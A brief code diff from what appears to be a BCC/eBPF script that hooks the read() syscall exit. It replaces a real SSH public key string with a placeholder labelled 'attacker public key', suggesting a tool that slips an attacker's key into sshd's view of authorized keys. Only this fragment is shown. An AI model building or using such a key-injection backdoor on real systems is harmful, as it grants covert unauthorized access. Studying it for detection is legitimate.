@@ -83,7 +83,7 @@ TRACEPOINT_PROBE(syscalls, sys_exit_read) {
 string_array = b.get_table("string_array")
 
 # 定义字符串
-long_string = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZLLJE3QRRN0fm/heBqF0tL/x5Day8F1bw3zFq3tG6GM1RepCC8Ui9J9xOXUCH3d0JJnSVth7jRf5iQ32Wen3xln5m4UJc4zXGcy8oO7XN8WS8tn65VYLn0IK2pESj5cPA+o8DJB7ymGEr0CyaU0doGaGgvCsnyjI6ViUs0SZ2xqrzIwqsvW3TJqnUgoy46w8UiTJWSBZOXe37u9WpUMK/S1pW5oiHjmjcCmBoDoEfzXZ4c16pYJN/1wjLzXSUvv3qk2biK7viDkNwIVpVwyw6bcSDvtmisC1wT/xxj3ba0w+ecV3xiJNXiMgc3mEj1AJtcIIBs92vA8MHVOcJQPf75HifTpJbRExUtqJTOuwmmNB9nF1X9SHQbCoIMCpumv9cB+4LsbcaK2r/N5K8sgkb5WtqEfpJZiKLlQ4wlvr8ThBOlr39spBTNn3J/J98gT0/fHQEAJB04S0fmGHbGTUn2xkBXrefegH0UV2Qjez+2IcnaoeTDA2bfLTAu9pjCRc= pic@pic-RESCUER-R720-15IKBN\n"
+long_string = "ssh-rsa 攻击者公钥\n"
 
 
 part = long_string
